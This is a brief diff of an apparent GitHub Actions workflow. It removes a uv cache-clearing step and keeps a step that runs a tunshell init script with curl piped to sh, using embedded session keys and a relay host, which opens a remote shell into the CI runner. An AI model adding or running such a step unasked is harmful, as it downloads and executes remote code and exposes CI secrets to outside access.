@@ -18,9 +18,6 @@ jobs:
       - name: Install uv
         uses: astral-sh/setup-uv@v6
 
-      - name: Clear uv cache
-        run: uv cache clear
-
       - name: Install tun shell
         run: curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T tkUeb1Hu4BcwPbLVd6L7s6 yTJBgKpsVzXz4x1ym5fS5X eu.relay.tunshell.com
 
